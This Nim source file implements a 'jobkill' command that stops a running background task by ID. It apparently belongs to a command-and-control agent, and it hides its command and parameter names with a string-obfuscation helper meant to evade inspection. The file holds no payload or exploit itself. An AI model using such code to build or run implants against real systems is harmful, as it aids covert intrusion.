import std/[json, strutils]
import core/types
import core/jobs
import commands/registry
import crypto/strenc

proc jobkillExecute(taskId: string, params: JsonNode, state: AgentState,
                    send: SendMsg): TaskResult =
  let tid = params{hidstr("task_id")}.getStr("").strip()
  if tid.len == 0:
    return TaskResult(output: "Error: task_id required",
                      status: "error", completed: true)
  if not jobIsAlive(tid):
    return TaskResult(output: "No active job with task_id=" & tid,
                      status: "error", completed: true)
  jobKill(tid)
  return TaskResult(output: "Killed job task_id=" & tid,
                    status: "success", completed: true)

proc initJobkill*() =
  register(hidstr("jobkill"), jobkillExecute)
